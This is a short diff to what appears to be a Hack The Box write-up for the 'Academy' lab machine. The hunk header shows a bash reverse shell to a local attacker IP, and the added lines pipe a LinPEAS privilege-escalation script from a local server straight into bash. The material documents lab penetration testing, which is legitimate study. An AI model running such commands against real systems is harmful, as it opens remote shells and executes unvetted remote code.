@@ -146,3 +146,9 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.85/9001 0>&1'
 ▶ ssh cry0l1t3@10.10.10.215
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c873204a-0966-46ae-87ac-5b58310623d6)
+# LinPEAS
+  - Start python server to curl LinPEAS on academy.
+  - Curl and execute LinPEAS.
+```CSS
+$ curl http://10.10.14.85:8000/linpeas.sh | bash
+```
